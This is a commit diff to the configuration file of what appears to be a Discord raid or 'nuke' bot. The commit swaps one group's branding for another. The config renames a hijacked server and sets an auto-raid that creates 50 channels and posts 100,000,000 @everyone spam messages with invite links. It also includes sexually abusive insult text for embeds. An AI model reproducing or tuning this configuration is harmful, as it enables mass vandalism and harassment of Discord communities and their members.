1dd7b9f556b54c5997ca3099277bc66a9ad5331e
srivastavatanmay521-alt <srivastavatanmay521@gmail.com>
2026-05-26 21:14:00 +0530

    Update config.py

--- config.py
+++ config.py
@@ -1,23 +1,23 @@
 # DONT TOUCH IT
 
 SERVER_CONFIG = {
-    "new_name": "REX // 666",  
-    "new_description": "FUCKED BY REX",  
+    "new_name": "FUCKED BY VOID",  
+    "new_description": "RETRACT VOID KA BETA",  
     "new_icon": "https://i.imgur.com/aL0Q8ty.jpeg"
 }
 
 
 WEBHOOK_CONFIG = {
-    "default_name": "REX // 666",   
+    "default_name": "KNOWNX VOID KA BETA",   
 }
 
 
 AUTO_RAID_CONFIG = {
     'num_channels': 50,  
     'channel_type': 'text',   
-    'channel_name': 'REX // 666 x WALTER',  
+    'channel_name': 'FUCKED BY VOID PAPA',  
     'num_messages': 100000000,   
-    'message_content':  'fucked by walter daddy @everyone https://discord.gg/XFQ8Ba3tQU' 
+    'message_content':  'fucked by KNOWNX KA PAPA daddy @everyone https://discord.gg/codez' 
 }
 
 NO_BAN_KICK_ID = {
@@ -31,13 +31,13 @@ BOT_PRESENCE = {
 }
 
 EMBED_CONFIG = {
-    "title": "WALTER DADDY IS HERE",    
+    "title": "VOID DADDY IS HERE",    
     "description": "SUCK DADDY'S DICK BITCH",            
     "color": 0xFF5733,      
     "fields": [
-        {"name": ".GG/REX // 666", "value": ".GG/REX // 666", "inline": False},     
-        {"name": ".GG/REX // 666", "value": ".GG/REX // 666", "inline": False},
-        {"name": ".GG/REX // 666", "value": ".GG/REX // 666", "inline": False},    
+        {"name": ".GG/CODEZ", "value": ".GG/CODEZ", "inline": False},     
+        {"name": ".GG/CODEZ", "value": ".GG/CODEZ", "inline": False},
+        {"name": ".GG/CODEZ", "value": ".GG/CODEZ", "inline": False},    
     ],
         "footer": "",     
 }
